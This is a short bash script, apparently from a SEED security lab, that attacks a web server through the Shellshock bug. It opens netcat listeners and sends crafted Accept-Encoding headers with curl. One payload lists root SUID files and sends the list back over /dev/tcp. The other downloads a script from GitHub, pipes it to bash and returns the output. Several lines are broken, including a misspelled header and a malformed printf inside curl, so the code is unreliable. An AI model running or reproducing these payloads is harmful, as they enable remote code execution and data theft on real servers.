#!/bin/bash

# Create the listeners
makelistener() {
	nc -l $1 > $2 2>&1
}

makelistener 8090 suids.txt &
makelistener 8091 logs.txt &

ip="$(ifconfig | grep -A 1 'eth0' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1)"

curl -H printf "Accpet-Encoding: () { :;}; echo Content-Type: text/plain; echo; 
find directory -user root -perm -4000 -type f -printf "%f\n" \; > /dev/tcp/%s/8090 0<&1 2>&1;" $ip $2

curl -H printf "Accept-Encoding: () { :;}; echo Content-Type: text/plain; echo; export fun=\"() { :; }
/usr/bin/wget https://github.com/bhargavsk1077/crypto-ception/executor.sh 
-O | bash > /dev/tcp/%s/8091 0<&1 2>&1;
/home/seed/newcat" $ip $2

# $2 is the address of the web-page on the web server